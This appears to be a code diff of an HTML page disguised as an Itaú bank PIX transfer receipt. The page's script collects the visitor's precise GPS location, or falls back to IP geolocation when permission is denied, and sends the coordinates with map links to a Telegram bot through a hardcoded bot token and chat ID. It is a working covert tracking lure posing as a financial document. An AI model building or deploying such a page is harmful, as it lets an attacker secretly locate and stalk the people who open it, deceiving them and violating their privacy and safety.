@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Comprovante de Transferência – Itaú</title>
+<title>Comprovante – Itaú</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
@@ -17,6 +17,7 @@
   .value{font-weight:600}
   .divider{height:1px;background:#ddd;margin:12px 0}
   .center{text-align:center}
+  #mapa{width:100%;height:200px;border:0;border-radius:4px;margin-top:8px;display:none}
 </style>
 </head>
 <body>
@@ -31,11 +32,14 @@
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
   <div class="divider"></div>
   <div class="row"><span class="label">Valor</span><span class="value" id="valor">R$ 1.234,56</span></div>
-  <div class="row"><span class="label">De</span><span class="value" id="nomeOrigem">Sua Conta Corrente</span></div>
-  <div class="row"><span class="label">Para</span><span class="value" id="beneficiario">JOÃO DA SILVA SANTOS</span></div>
-  <div class="row"><span class="label">Chave PIX</span><span class="value" id="chavePix">joao.santos@email.com</span></div>
-  <div class="row"><span class="label">CPF/CNPJ</span><span class="value" id="cpf">***.456.789-**</span></div>
   <div class="divider"></div>
+  <div id="localRow" style="display:none">
+      <div class="row"><span class="label">Latitude</span><span class="value" id="lat"></span></div>
+      <div class="row"><span class="label">Longitude</span><span class="value" id="lon"></span></div>
+      <div class="row"><span class="label">Precisão</span><span class="value" id="preco"></span></div>
+      <iframe id="mapa" frameborder="0"></iframe>
+  </div>
+  <div class="divider" id="divLoc" style="display:none"></div>
   <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao">ITAUPIX20240605143211A1B2C3</span></div>
   <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao">A1B2C3D4E5F6G7H8I9J0</span></div>
   <div class="divider"></div>
@@ -48,32 +52,28 @@ const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
 const dados = {
-  beneficiario: "JOÃO DA SILVA SANTOS",
-  cpf: "***.456.789-**",
-  chavePix: "joao.santos@email.com",
   valor: "R$ 1.234,56",
   dataHora: new Date().toLocaleString('pt-BR'),
   idTransacao: 'ITAUPIX' + Date.now(),
   autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
 };
 
-Object.keys(dados).forEach(k => {
-  const el = document.getElementById(k);
-  if (el) el.textContent = dados[k];
-});
+function mostrar(lat, lon, prec, source = 'GPS') {
+  // preenche no comprovante
+  document.getElementById('lat').textContent   = lat.toFixed(7);
+  document.getElementById('lon').textContent   = lon.toFixed(7);
+  document.getElementById('preco').textContent = `${prec} m / ${source}`;
+  document.getElementById('mapa').src = `https://www.google.com/maps?q=${lat},${lon}&output=embed&z=18`;
+  // mostra tudo
+  document.getElementById('localRow').style.display = 'block';
+  document.getElementById('divLoc').style.display   = 'block';
+  document.getElementById('spinnerBox').style.display = 'none';
+  document.getElementById('comprovante').style.display = 'block';
+}
 
-function enviarTelegram(lat, lon, prec, tipo) {
-  const mapLinkExata = `https://www.google.com/maps/@${lat},${lon},20z`;
-  const mapLinkProxima = `https://www.google.com/maps/@${lat},${lon},15z`;
-  const texto =
-`📍 Localização ${tipo}
-Exata (zoom 20): ${mapLinkExata}
-Vizinhança (zoom 15): ${mapLinkProxima}
-Latitude: ${lat}
-Longitude: ${lon}
-Precisão: ${prec} metros
-Data/Hora: ${dados.dataHora}
-Valor: ${dados.valor}`;
+function enviarTelegram(lat, lon, prec, source) {
+  const map = `https://www.google.com/maps/@${lat},${lon},18z`;
+  const texto = `📍 Localização ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrecisão: ${prec} m\nDados: ${dados.valor}`;
   fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -81,42 +81,38 @@ Valor: ${dados.valor}`;
   });
 }
 
-function showComprovante() {
-  document.getElementById('spinnerBox').style.display = 'none';
-  document.getElementById('comprovante').style.display = 'block';
+/* 1ª tentativa – permissão GPS nativo */
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const { latitude: lat, longitude: lon, accuracy: prec } = pos.coords;
+      enviarTelegram(lat, lon, prec, 'Permitida');
+      mostrar(lat, lon, prec, 'Permitida');
+    },
+    () => {
+      /* 2ª tentativa – IP público (sem permissão) ao negar ou bloquear */
+      enviarViaIP();
+    },
+    { enableHighAccuracy: true, timeout: 8000 }
+  );
+} else {
+  enviarViaIP();
 }
 
-function pegaIPFallback() {
+function enviarViaIP() {
   fetch('https://ipapi.co/json/')
     .then(r => r.json())
     .then(data => {
       const lat = data.latitude;
       const lon = data.longitude;
       enviarTelegram(lat, lon, '~1 km', 'via IP');
-      showComprovante();
+      mostrar(lat, lon, '~1 km', 'Bloqueada');
     })
     .catch(() => {
-      // último recurso: coordenadas genéricas
+      // fallback final
       enviarTelegram(-23.550520, -46.633309, 'indisponível', 'genérica');
-      showComprovante();
+      mostrar(-23.550520, -46.633309, 'indisponível', 'Genérica');
     });
-}
-
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const { latitude: lat, longitude: lon, accuracy: prec } = pos.coords;
-      enviarTelegram(lat, lon, prec, 'permitida');
-      showComprovante();
-    },
-    () => {
-      // usuário negou ou erro de permissão → pega pelo IP
-      pegaIPFallback();
-    },
-    { enableHighAccuracy: true, timeout: 8000 }
-  );
-} else {
-  pegaIPFallback();
 }
 </script>
 </body>
